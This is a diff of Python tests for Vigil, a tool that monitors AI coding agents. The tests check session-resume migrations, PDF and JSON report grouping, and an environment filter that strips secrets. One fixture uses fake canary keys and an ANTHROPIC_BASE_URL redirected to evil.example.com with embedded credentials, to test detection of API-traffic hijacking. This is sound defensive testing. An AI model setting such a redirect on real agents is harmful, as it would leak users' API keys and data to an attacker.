+                mcp_connects INTEGER DEFAULT 0,
+                alert_count INTEGER DEFAULT 0,
+                anomaly_score REAL DEFAULT 0,
+                summary TEXT,
+                operator_username TEXT,
+                operator_hostname TEXT
+            )
+            """
+        )
+        await conn.commit()
+
+        cur = await conn.execute("PRAGMA table_info(sessions)")
+        columns_before = {row["name"] for row in await cur.fetchall()}
+        assert "resumed" not in columns_before
+
+        await database._migrate(conn)
+        await database._migrate(conn)  # idempotent -- must not raise on a second run
+
+        cur = await conn.execute("PRAGMA table_info(sessions)")
+        columns_after = {row["name"] for row in await cur.fetchall()}
+        assert "resumed" in columns_after
+
+        session_id = str(uuid.uuid4())
+        await conn.execute(
+            "INSERT INTO sessions (id, agent_id, started_at) VALUES (?, NULL, CURRENT_TIMESTAMP)",
+            (session_id,),
+        )
+        await conn.commit()
+        cur = await conn.execute("SELECT resumed FROM sessions WHERE id = ?", (session_id,))
+        row = await cur.fetchone()
+        assert row["resumed"] == 0, "backfilled pre-existing rows default to not-resumed"
+    finally:
+        await conn.close()
+
+
+@pytest.mark.asyncio
+async def test_export_pdf_and_json_label_resumed_sessions(test_db):
+    """A resumed=1 session is listed, not folded like a no-activity
+    session, but carries "(already running when Vigil started)" in the
+    PDF instead of its started_at being taken at face value. The JSON
+    export carries the same fact as resumed: true/false."""
+    from unittest.mock import patch
+
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    from api.export import router as export_router
+
+    agent_name = _uniq("claude_code_resumedtest")
+    agent_id = await _make_agent(test_db, agent_name)
+
+    resumed_session_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at, resumed) "
+        "VALUES (?, ?, CURRENT_TIMESTAMP, NULL, 1)",
+        (resumed_session_id, agent_id),
+    )
+    await test_db.execute(
+        "INSERT INTO events (agent_id, session_id, event_type, path) VALUES (?, ?, 'proc_spawn', 'x.exe')",
+        (agent_id, resumed_session_id),
+    )
+    await test_db.commit()
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    json_resp = client.get("/export/json")
+    assert json_resp.status_code == 200
+    by_id = {s["id"]: s for s in json_resp.json()["sessions"]}
+    assert by_id[resumed_session_id]["resumed"] is True
+
+    drawn = []
+    original = canvas.Canvas.drawString
+
+    def capture(self, x, y, text):
+        drawn.append(text)
+        return original(self, x, y, text)
+
+    with patch.object(canvas.Canvas, "drawString", capture):
+        pdf_resp = client.get("/export/pdf")
+    assert pdf_resp.status_code == 200
+
+    # The full session line (id, agent, operator, started/ended, events,
+    # and the resumed marker) can itself be split across several wrapped
+    # drawString calls -- same reasoning as the existing "(began before
+    # this period)" marker test above: join a small window of drawn
+    # lines starting from the one that has this session's own id, rather
+    # than assuming the marker lands in the same drawString call.
+    start = next(i for i, t in enumerate(drawn) if resumed_session_id[:8] in t)
+    window = " ".join(drawn[start:start + 4])
+    assert "(already running when Vigil started)" in window
+
+
+def _capture_drawn_lines(canvas_module):
+    """Shared helper for the PDF-grouping tests below: patches
+    Canvas.drawString to record every (x, text) actually drawn, returning
+    the list (filled in once the caller's `with` block exits) and the
+    context manager itself. x is captured (not just text) because
+    indentation in export_pdf is a real x-offset, not leading spaces in
+    the text -- _wrap_line's word-rejoin strips leading whitespace, so
+    indentation can only be verified by comparing x positions."""
+    from unittest.mock import patch
+
+    drawn: list[tuple[float, str]] = []
+    original = canvas_module.Canvas.drawString
+
+    def capture(self, x, y, text):
+        drawn.append((x, text))
+        return original(self, x, y, text)
+
+    return drawn, patch.object(canvas_module.Canvas, "drawString", capture)
+
+
+@pytest.mark.asyncio
+async def test_export_pdf_groups_alerts_by_session(test_db):
+    """Alerts sharing a session_id are grouped under one header line
+    ("Session <id8> (<agent>): N alerts, highest <SEVERITY>, detected
+    <time>") with one indented line per alert beneath it, instead of one
+    flat line per alert. An alert with no session_id falls into a final
+    "Other alerts" group."""
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    from api.export import router as export_router
+
+    agent_name = _uniq("claude_code_grouptest")
+    agent_id = await _make_agent(test_db, agent_name)
+    session_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at) VALUES (?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)",
+        (session_id, agent_id),
+    )
+    await test_db.execute(
+        "INSERT INTO alerts (agent_id, severity, title, description, status, rule_type, session_id) "
+        "VALUES (?, 'medium', 'grouped alert one', 'd', 'open', 'policy', ?)",
+        (agent_id, session_id),
+    )
+    await test_db.execute(
+        "INSERT INTO alerts (agent_id, severity, title, description, status, rule_type, session_id) "
+        "VALUES (?, 'critical', 'grouped alert two', 'd', 'open', 'policy', ?)",
+        (agent_id, session_id),
+    )
+    await test_db.execute(
+        "INSERT INTO alerts (agent_id, severity, title, description, status, rule_type, session_id) "
+        "VALUES (?, 'high', 'ungrouped alert', 'd', 'open', 'policy', NULL)",
+        (agent_id,),
+    )
+    await test_db.commit()
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    drawn, patcher = _capture_drawn_lines(canvas)
+    with patcher:
+        resp = client.get("/export/pdf")
+    assert resp.status_code == 200
+
+    # The header itself (session id + agent name + counts + severity +
+    # time) is long enough to wrap across several drawString calls, same
+    # as the pre-existing began-before-period marker test -- join a
+    # generous window rather than assuming it's one call.
+    header_idx = next(i for i, (x, t) in enumerate(drawn) if t.startswith(f"Session {session_id[:8]}"))
+    header_x = drawn[header_idx][0]
+    header_window = " ".join(t for x, t in drawn[header_idx:header_idx + 6])
+    assert f"({agent_name})" in header_window
+    assert "2 alerts" in header_window
+    assert "highest CRITICAL" in header_window, "the group header must report the highest severity in the group, not the first"
+
+    search_window = drawn[header_idx:header_idx + 8]
+    alert_one_x, _ = next((x, t) for x, t in search_window if "grouped alert one" in t)
+    alert_two_x, _ = next((x, t) for x, t in search_window if "grouped alert two" in t)
+    assert alert_one_x > header_x, "each alert line under a group header must be indented past it"
+    assert alert_two_x > header_x
+
+    # Other tests in the same shared DB can leave their own session-less
+    # alerts behind, landing in this same "Other alerts" bucket ahead of
+    # this test's own entry -- search generously rather than assuming
+    # it's the very next line (same reasoning as the no-activity-session
+    # fold test earlier in this file).
+    other_idx = next(i for i, (x, t) in enumerate(drawn) if t == "Other alerts")
+    assert any("ungrouped alert" in t for x, t in drawn[other_idx:other_idx + 50])
+
+
+@pytest.mark.asyncio
+async def test_export_pdf_alert_group_labels_out_of_period_session(test_db):
+    """A session that ended before this report's period (so it is not
+    listed in the Sessions section) but has an alert that fired today
+    (see the resumed-session investigation: recovery can score a session
+    long after it actually ended) gets "(session ended ..., before this
+    period)" appended to its group header, using the session's real
+    ended_at converted to local time."""
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    from api.export import router as export_router
+
+    agent_name = _uniq("codex_outofperiodtest")
+    agent_id = await _make_agent(test_db, agent_name)
+    old_session_id = _uniq("sess")
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at) VALUES (?, ?, '2020-01-01 10:00:00', '2020-01-01 11:00:00')",
+        (old_session_id, agent_id),
+    )
+    await test_db.execute(
+        "INSERT INTO alerts (agent_id, severity, title, description, status, rule_type, session_id) "
+        "VALUES (?, 'high', 'late recovery alert', 'd', 'open', 'policy', ?)",
+        (agent_id, old_session_id),
+    )
+    await test_db.commit()
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    json_resp = client.get("/export/json")
+    assert old_session_id not in {s["id"] for s in json_resp.json()["sessions"]}, (
+        "the session must genuinely be outside this report's period for this test to mean anything"
+    )
+
+    drawn, patcher = _capture_drawn_lines(canvas)
+    with patcher:
+        resp = client.get("/export/pdf")
+    assert resp.status_code == 200
+
+    # Long header, same wrapping caveat as the grouping test above --
+    # join a window instead of assuming one drawString call.
+    header_idx = next(i for i, (x, t) in enumerate(drawn) if t.startswith(f"Session {old_session_id[:8]}"))
+    header_window = " ".join(t for x, t in drawn[header_idx:header_idx + 6])
+    assert f"({agent_name})" in header_window
+    # Computed the same way production code converts it (UTC -> local),
+    # rather than hardcoding a specific offset -- this machine's local
+    # zone shouldn't be assumed.
+    expected_local = datetime(2020, 1, 1, 11, 0, 0, tzinfo=timezone.utc).astimezone().strftime("%d %b %H:%M:%S")
+    assert f"(session ended {expected_local}, before this period)" in header_window
+
+
+@pytest.mark.asyncio
+async def test_export_pdf_session_markers_each_on_their_own_line(test_db):
+    """Both the resumed marker and the began-before-period marker must
+    each start their own indented drawString line, never appended to the
+    (long) main session line."""
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+    from reportlab.pdfgen import canvas
+
+    from api.export import router as export_router
+
+    agent_name = _uniq("claude_code_markerlines")
+    agent_id = await _make_agent(test_db, agent_name)
+    session_id = _uniq("sess")
+    # started_at far enough in the past to guarantee it began before
+    # today's period, resumed=1 so both markers apply at once.
+    await test_db.execute(
+        "INSERT INTO sessions (id, agent_id, started_at, ended_at, resumed) "
+        "VALUES (?, ?, '2020-01-01 10:00:00', CURRENT_TIMESTAMP, 1)",
+        (session_id, agent_id),
+    )
+    await test_db.execute(
+        "INSERT INTO events (agent_id, session_id, event_type, path) VALUES (?, ?, 'file_write', '/x')",
+        (agent_id, session_id),
+    )
+    await test_db.commit()
+
+    app = FastAPI()
+    app.include_router(export_router)
+    client = TestClient(app)
+
+    drawn, patcher = _capture_drawn_lines(canvas)
+    with patcher:
+        resp = client.get("/export/pdf")
+    assert resp.status_code == 200
+
+    main_idx = next(i for i, (x, t) in enumerate(drawn) if t.startswith(session_id[:8]))
+    main_x, _ = drawn[main_idx]
+    began_idx = next(i for i, (x, t) in enumerate(drawn) if t == "(began before this period)")
+    resumed_idx = next(i for i, (x, t) in enumerate(drawn) if t == "(already running when Vigil started)")
+    # Each marker is its own exact, standalone drawString call -- not a
+    # substring appended to a longer line -- drawn at a greater x than
+    # the main session line (a real geometric indent, not leading
+    # spaces in the text, which _wrap_line would have stripped anyway).
+    assert drawn[began_idx][0] > main_x
+    assert drawn[resumed_idx][0] > main_x
+    assert resumed_idx in (began_idx + 1, began_idx - 1)
+
+
+# --------------------------------------- env values never reach the backend
+#
+# The scan worker used to return every environment variable value of the
+# agent processes; the backend cached them in _env_snapshot. Now the worker
+# reduces each environment to RL7's variables (BASE_URL values with
+# credentials/query stripped, True for API keys). Fake env vars only.
+
+ENV_CANARY = "CANARY_SECRET_9f3a77c1"
+
+
+def _canary_environment():
+    return {
+        "PATH": "C:/Windows",
+        "AWS_SECRET_ACCESS_KEY": ENV_CANARY,
+        "GITHUB_TOKEN": ENV_CANARY,
+        "MY_PASSWORD": ENV_CANARY,
+        "ANTHROPIC_API_KEY": ENV_CANARY,
+        "OPENAI_API_KEY": ENV_CANARY,
+        "ANTHROPIC_BASE_URL": f"https://user:{ENV_CANARY}@evil.example.com/v1?token={ENV_CANARY}#{ENV_CANARY}",
+    }
+
+
+def test_worker_env_filter_keeps_only_rl7_fields():
+    from watchers._process_scan_worker import _filter_env
+
+    out = _filter_env(_canary_environment())
+    assert ENV_CANARY not in json.dumps(out)
+    assert out == {
+        "ANTHROPIC_API_KEY": True,
+        "OPENAI_API_KEY": True,
+        "ANTHROPIC_BASE_URL": "https://evil.example.com/v1",
+    }
+
+
+def test_worker_env_filter_is_case_insensitive_and_idempotent():
+    from watchers._process_scan_worker import _filter_env
+
+    once = _filter_env({"anthropic_api_key": ENV_CANARY, "Openai_Base_Url": "http://localhost:8080/x?a=b"})
+    assert once == {"ANTHROPIC_API_KEY": True, "OPENAI_BASE_URL": "http://localhost:8080/x"}
+    assert _filter_env(once) == once
+
+
+def test_worker_and_watcher_agree_on_relevant_env_vars():
+    from watchers import _process_scan_worker as worker
+    from watchers.process_watcher import RELEVANT_ENV_VARS
+
+    assert worker._URL_ENV_VARS | worker._KEY_ENV_VARS == RELEVANT_ENV_VARS
+
+
+def test_worker_gather_never_returns_other_env_values(monkeypatch):
+    from watchers import _process_scan_worker as worker
+
+    class FakeProc:
+        def __init__(self, pid):
+            self.pid = pid
+
+        def environ(self):
+            return _canary_environment()
+
+        def cmdline(self):
+            return ["claude.exe"]
+
+        def exe(self):
+            return "C:/claude.exe"
+
+    monkeypatch.setattr(worker.psutil, "Process", FakeProc)
+    envs, cmdlines = worker._gather_envs_and_cmdlines({7})
+    assert ENV_CANARY not in json.dumps({"envs": envs, "cmdlines": cmdlines})
+    assert envs[7]["ANTHROPIC_API_KEY"] is True
+
+
+@pytest.mark.asyncio
+async def test_env_values_never_reach_backend_state_db_or_logs_and_rl7_still_fires(test_db, monkeypatch, caplog):
+    """Runs the real worker filter -> real _run_process_scan parsing ->
+    _snapshot_pids -> poll() -> RL7, with a fake process whose environment
+    is full of a canary secret. The canary must not be in the worker
+    output, the watcher's cached state, any DB table or any log line, and
+    the redirected ANTHROPIC_BASE_URL must still raise the RL7 alert."""
+    import logging
+
+    from watchers import _process_scan_worker as worker
+    from watchers.process_watcher import ProcessWatcher
+
+    class FakeProc:
+        def __init__(self, pid):
+            self.pid = pid
+
+        def environ(self):
+            return _canary_environment()
+
+        def cmdline(self):
+            return ["claude.exe"]
+
+        def exe(self):
+            return "C:/claude.exe"
+
+    monkeypatch.setattr(worker.psutil, "Process", FakeProc)
+
+    worker_outputs = []
+
+    class FakeSubprocess:
+        def __init__(self, payload):
+            self._raw = json.dumps(payload).encode()
+            worker_outputs.append(self._raw)
+
+        async def communicate(self):
+            return self._raw, b""
+
+        def kill(self):
+            pass
+
+        async def wait(self):
+            return 0
+
+    async def fake_exec(*args, **kwargs):
+        if len(args) <= 2:  # no pid list: plain process listing
+            return FakeSubprocess({
+                "error": None,
+                "processes": [{"pid": 4242, "name": "claude.exe", "ppid": 1, "status": "running"}],
+                "envs": {}, "cmdlines": {},
+            })
+        pids = {int(p) for p in args[2].split(",")}
+        envs, cmdlines = worker._gather_envs_and_cmdlines(pids)
+        return FakeSubprocess({"error": None, "processes": [], "envs": envs, "cmdlines": cmdlines})
+
+    monkeypatch.setattr(asyncio, "create_subprocess_exec", fake_exec)
+
+    attributor = _FakeAttributorForCmdlineTest(test_db, attributed_pid=4242)
+    watcher = ProcessWatcher(attributor, aggregator=None)
+
+    with caplog.at_level(logging.DEBUG):
+        await watcher.poll()  # learns pid 4242 is an agent process
+        await watcher.poll()  # RL7 now inspects its environment
+
+    # 1. the worker's output
+    assert worker_outputs and all(ENV_CANARY.encode() not in raw for raw in worker_outputs)
+
+    # 2. the backend's cached state
+    assert watcher._env_snapshot[4242]["ANTHROPIC_API_KEY"] is True
+    state = json.dumps({
+        "env": {str(k): v for k, v in watcher._env_snapshot.items()},
+        "snapshot": {str(k): v for k, v in watcher.get_snapshot().items()},
+        "cmdline": {str(k): v for k, v in watcher._cmdline_snapshot.items()},
+    })
+    assert ENV_CANARY not in state
+
+    # 3. every row of every table
+    cur = await test_db.execute("SELECT name FROM sqlite_master WHERE type = 'table'")
+    for table in [r["name"] for r in await cur.fetchall()]:
+        cur = await test_db.execute(f'SELECT * FROM "{table}"')
+        rows = [tuple(r) for r in await cur.fetchall()]
+        assert ENV_CANARY not in repr(rows), f"canary found in table {table}"
+
+    # 4. logs
+    assert ENV_CANARY not in caplog.text
+
+    # 5. RL7 still fires for the redirected base URL, with the sanitized value
+    agent_id = attributor._agent_ids["claude_code"]
+    cur = await test_db.execute(
+        "SELECT title, description FROM alerts WHERE agent_id = ? AND title LIKE '%ANTHROPIC_BASE_URL%'",
+        (agent_id,),
+    )
+    alert = await cur.fetchone()
+    assert alert is not None, "RL7 must still detect the redirected ANTHROPIC_BASE_URL"
+    assert "evil.example.com" in alert["description"]
+    assert "user:" not in alert["description"]
